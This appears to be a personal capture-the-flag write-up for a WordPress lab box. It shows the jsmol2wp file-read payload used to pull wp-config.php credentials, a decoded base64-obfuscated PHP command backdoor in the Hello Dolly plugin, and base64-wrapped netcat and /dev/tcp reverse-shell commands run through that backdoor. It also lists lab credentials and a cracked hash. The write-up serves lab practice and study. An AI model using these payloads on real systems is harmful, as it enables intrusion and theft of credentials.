
# information gathering

## 1. port scanning:
`sudo nmap -sS -sV -sC -T5 10.67.141.183`

![[Pasted image 20251210202508.png]]
We found a open http server let's try to interact with it:

It seems we can't connect, let's investigate further with curl:
`curl -v 10.67.141.183`

We need to add `www.smol.thm` to `/etc/hosts`:
`sudo vim /etc/hosts`

Now we can interact with the web server
## 2. directory fuzzing:
`dirb www.smol.thm`

## 3. Enumerating WordPress
`wpscan --url www.smol.thm --api-token <api-token>`
![[Pasted image 20251210203152.png]]
There are more vulnerabilities, but these are interesting because they are unauthenticated:

After a little research I found the following payload:
`http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

from https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/

we can simply edit the ip and port to match our target:
`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
# initial access

Let's use the SSRF to see the `wp-config.php` file that contains the wordpress password:
![[Pasted image 20251210203748.png]]
found the following creds: `wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`

![[Pasted image 20251210204113.png]]

We have gained access to the admin panel let's investigate for further enumeration:
![[Pasted image 20251210204247.png]]
We found a private page named webmaster tasks!!
![[Pasted image 20251210204348.png]]
We found a to-do list with interesting stuff, mainly:

*1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.*
*6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.*
*8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.*

Let's look at the hello-dolly plugin, we can try and find it in the /wp-content/plugins/.
http://www.smol.thm/wp-content/plugins/hello.php

I tried to access it via the browser but got a 500
![[Pasted image 20251210211211.png]]
Let's try accessing it with the SSRF:
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php

![[Pasted image 20251210211910.png]]

We found an interesting line that decodes and runs a base64 encoding

We can visualize it with: `echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d`

and we get:
![[Pasted image 20251210212323.png]]
`if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`

basically if we perform a get request with `"\143\155\x64"`, we run a system command `"$_GET["\143\x6d\144"]);" `, what ever that octal code means...

we can discover what that hex means by using a decoder like cyberchef:

![[Pasted image 20251210221338.png]]

 `if (isset($_GET["cmd"])) { system($_GET["cmd"]); }`

Let's try to get access to this backdoor:
`http://www.smol.thm/wp-admin/?cmd=ls`
Bingo!
![[Pasted image 20251211102532.png]]

Let's exploit this to get a reverse shell

1. let's take a bash rev shell onliner and base64 encode it
`base64`

busybox nc 10.14.90.235 4444 -e /bin/bash
echo 'YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g=' | base64 -d


2. Then we place this base64 encoded payload into a command that will decode it and then run it:
`echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xNzcuMTAzLzQ0NDQgPCYxJwo= | base64 -d | bash`
3. Now we can run the payload without it braking or escaping, let's start a listener and run the payload
![[Pasted image 20251211103853.png]]

`http://www.smol.thm/wp-admin/?cmd=echo YnVzeWJveCBuYyAxOTIuMTY4LjE3Ny4xMDMgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | bash`
# privilege escalation

`$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia`